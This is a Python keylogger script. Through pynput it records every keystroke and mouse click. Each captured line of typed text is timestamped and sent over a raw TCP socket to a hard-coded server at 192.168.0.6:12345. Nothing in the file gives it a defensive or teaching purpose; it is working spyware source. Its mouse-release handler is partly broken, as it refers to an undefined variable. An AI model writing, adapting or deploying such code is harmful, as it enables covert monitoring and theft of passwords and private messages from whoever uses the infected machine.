import threading
import time
import socket
from datetime import datetime
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Key, Listener

server_address = ("192.168.0.6", 12345)
current_line = f"{datetime.now()} - "

def send_data(data):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect(server_address)
        sock.sendall(data.encode())
        response = sock.recv(1024).decode()
        print(f"Server response: {response}")

def on_press(key):
    global current_line
    if key == Key.space or key == Key.enter:
        if " - " in current_line and current_line.split(" - ", 1)[1].strip():
            send_data(current_line)
            current_line = f"{datetime.now()} - "
    else:
        try:
            current_line += key.char
        except AttributeError:
            current_line += f" [{key}] "

def on_release(key):
    if key == Key.esc:
        return False

def on_mouse_release():
    if escape:
        return False

def on_click(x, y, button, pressed):
    global current_line
    if " - " in current_line and current_line.split(" - ", 1)[1].strip():
        send_data(current_line)
        current_line = f"{datetime.now()} - "

def run_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def run_mouselogger():
    with MouseListener(on_click=on_click, on_release=on_mouse_release) as mouseListener:
        mouseListener.join()

def main():
    t1 = threading.Thread(target=run_keylogger, daemon=True)
    t2 = threading.Thread(target=run_mouselogger, daemon=True)
    t1.start()
    t2.start()
    t1.join()

if __name__ == "__main__":
    main()
